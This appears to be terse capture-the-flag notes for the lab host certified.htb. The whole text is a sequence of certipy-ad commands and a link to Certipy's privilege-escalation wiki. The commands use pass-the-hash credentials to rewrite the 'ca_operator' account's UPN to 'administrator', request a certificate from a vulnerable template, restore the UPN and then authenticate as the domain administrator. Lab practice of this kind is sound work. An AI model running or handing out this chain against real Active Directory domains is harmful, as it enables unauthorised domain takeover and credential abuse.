certipy-ad  account -u 'management_svc@certified.htb' -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip $target -user 'ca_operator' read

certipy-ad  account -u 'management_svc@certified.htb' -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip $target -upn 'administrator' -user 'ca_operator' update

certipy-ad req -u 'ca_operator@certified.htb' -hashes b4b86f45c6018f1b664f70805f45d8f2 -dc-ip $target -target 'DC01.certified.htb' -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'

certipy-ad account -u 'management_svc@certified.htb' -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip $target -upn 'ca_operator@certified.htb' -user 'ca_operator' update

certipy-ad auth -dc-ip $target -pfx 'administrator.pfx' -username 'administrator' -domain certified.htb

<https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation>